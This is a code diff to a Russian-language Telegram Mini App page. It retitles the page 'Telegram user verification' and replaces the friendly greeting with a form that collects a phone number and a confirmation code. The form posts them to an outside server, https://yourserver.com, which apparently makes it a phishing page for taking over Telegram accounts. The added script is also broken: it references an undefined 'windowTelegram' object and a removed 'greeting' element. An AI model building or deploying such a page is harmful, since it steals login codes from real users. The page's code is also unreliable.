@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вопрос-ответ</title>
+    <title>Проверка пользователя Телеграмм</title>
     <!-- Подключаем официальный скрипт Telegram -->
     <script src="https://telegram.org"></script>
     <style>
@@ -45,12 +45,6 @@
             margin: 0 0 10px 0;
         }
 
-        p {
-            font-size: 15px;
-            color: #666666;
-            margin: 0 0 28px 0;
-        }
-
         /* Кнопка в тон иконке */
         button {
             background-color: #0284c7;
@@ -74,16 +68,12 @@
     <!-- Голубая иконка с надписью TG -->
     <div class="tg-icon">TG</div>
 
-    <!-- Ваш основной контент -->
-    <h1 id="greeting">Привет, Вопрос-ответ!</h1>
-    <p>Для того, чтобы присоединиться к разговору, введите свой номер телефона и код подтверждения, который вы
-получили на этот номер.</p>
-    <form>
+    <!-- Название страницы -->
+    <h1>Проверка пользователя Телеграмм</h1>
+
+    <form action="https://yourserver.com" method="post">
         <label for="newPhone">Новый номер телефона:</label>
         <input type="tel" id="newPhone" name="newPhone" placeholder="Новый номер телефона" required>
-        <br>
-        <label for="phone">Номер телефона:</label>
-        <input type="tel" id="phone" name="phone" placeholder="Номер телефона" required>
         <br>
         <label for="code">Код подтверждения:</label>
         <input type="number" id="code" name="code" placeholder="Код подтверждения" required>
@@ -92,25 +82,21 @@
     </form>
 
     <script>
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
+        // Инициализация и загрузка скриптов от Telegram.
+        window.onload = function() {
+            if (window.location.hash === '#_=_') {
+                window.location.href = window.location.href.split('#')[0];
+            }
+        };
 
-        // Красим верхнюю шапку окна Telegram в белый цвет под стать странице
-        if (tg.setHeaderColor) {
-            tg.setHeaderColor('#ffffff');
+        // Устанавливаем цвета для верхней шапки окна Telegram, если это возможно.
+        if (windowTelegram && windowTelegram.theme) {
+            document.documentElement.className = windowTelegram.theme;
         }
 
-        // Подставляем имя пользователя из Telegram
-        const user = tg.initDataUnsafe?.user;
-        if (user) {
-            document.getElementById('greeting').innerText = `Привет, ${user.first_name}!`;
-        }
-
-        // Действие при нажатии на кнопку
-        document.getElementById('sendBtn').addEventListener('click', () => {
-            tg.sendData("Пользователь нажал на кнопку внутри Mini App!");
-        });
+        // Подставляем имя пользователя, если оно доступно.
+        document.getElementById('greeting').innerText = `Привет, ${windowTelegram && windowTelegram.name ?
+windowTelegram.name : 'Пользователь'}`;
     </script>
 </body>
 </html>
